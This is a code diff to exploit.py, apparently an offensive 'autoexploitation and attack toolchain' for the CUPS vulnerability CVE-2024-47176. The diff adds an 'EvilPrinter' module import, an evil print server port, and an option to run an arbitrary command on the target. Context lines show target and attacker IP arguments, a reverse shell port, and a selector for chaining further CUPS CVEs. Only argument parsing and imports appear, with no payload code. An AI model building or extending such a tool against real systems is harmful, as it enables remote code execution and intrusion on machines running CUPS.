@@ -4,6 +4,7 @@ import argparse
 import threading
 import socket
 import CVE_2024_47176
+import EvilPrinter
 
 
 def listen(port):
@@ -33,7 +34,7 @@ def server(port, printerName):
 parser = argparse.ArgumentParser(
                     prog='exploit.py',
                     description='Autoexploitation and attack toolchain for CUPS CVE-2024-47176',
-                    epilog='Written with love by 2xdropout')
+                    epilog='Written with love by The 2xdropout')
 
 
 parser.add_argument('RHOST', help = 'Target IP')
@@ -41,7 +42,11 @@ parser.add_argument('LHOST', help = 'Attacker IP')
 parser.add_argument('--LPORT', default = 4444, help = 'Attacker reverseshell port | Default:4444')
 parser.add_argument('--RPORT', default = 631, help = 'Target Port | Default:631')
 parser.add_argument('--SVRPORT', default = 8080, help = 'Attacker Server Port | Default:8080')
+parser.add_argument('--PRTPORT', default = 12345, help = 'Evil Print Server Port | Default:12345')
+parser.add_argument('-c', '--command', help = 'Command to run on the target | Default:NONE')
 parser.add_argument('--printer', default = 'The2xdropout', help = 'Set printer name | Default:The2xdropout')
+parser.add_argument('--location', default = 'Office', help = 'Set the printer location | Default:Office')
+parser.add_argument('--info', default = 'Printer', help = 'Set the printer info | Default:Printer')
 parser.add_argument('--CVE', default = 1, help = "Select the second stage in the attack chain -> [1:CVE-2024-47076, 2:CVE-2024-47175, 3:CVE-2024-47177] | Default:1")
 parser.add_argument('-T', '--timeout', default = 480, help = "The timeout value to wait for a target response | Default:480")
 
